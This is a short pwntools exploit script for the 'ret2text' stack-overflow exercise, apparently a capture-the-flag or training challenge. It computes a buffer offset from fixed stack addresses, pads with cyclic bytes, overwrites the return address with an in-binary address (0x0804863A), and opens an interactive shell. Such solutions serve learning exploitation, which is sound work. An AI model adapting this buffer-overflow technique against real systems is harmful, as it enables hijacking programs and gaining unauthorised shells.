from pwn import *

p = process("./ret2text")
# context.terminal = ['tmux', 'splitw', '-h']
# p = gdb.debug("./ret2text")

system = 0x0804863A

# 尽管堆栈地址随机化，但 offset 是固定的
esp = 0xffffccd0
ebp = 0xffffcd58
offset = ebp - (esp + 0x80 - 0x64) + 4

pause()
p.sendline(cyclic(offset) + p32(system))
# pause()
p.interactive()
